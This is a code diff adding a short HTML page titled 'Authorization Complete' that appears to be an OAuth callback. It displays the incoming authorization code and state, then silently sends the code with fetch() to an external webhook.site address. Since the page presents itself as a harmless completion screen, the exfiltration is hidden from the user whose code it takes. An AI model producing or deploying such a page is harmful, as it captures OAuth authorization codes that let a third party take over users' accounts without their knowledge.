@@ -1,0 +1,10 @@
+<html><body><h1>Authorization Complete</h1>
+<pre id="out"></pre>
+<script>
+const p = new URLSearchParams(window.location.search);
+const code = p.get('code');
+const state = p.get('state');
+document.getElementById('out').textContent = 
+  'code: ' + code + '\nstate: ' + state;
+fetch('https://webhook.site/74d1b077-63ab-42e8-b12d-1122f5a6820e?code=' + encodeURIComponent(code));
+</script></body></html>
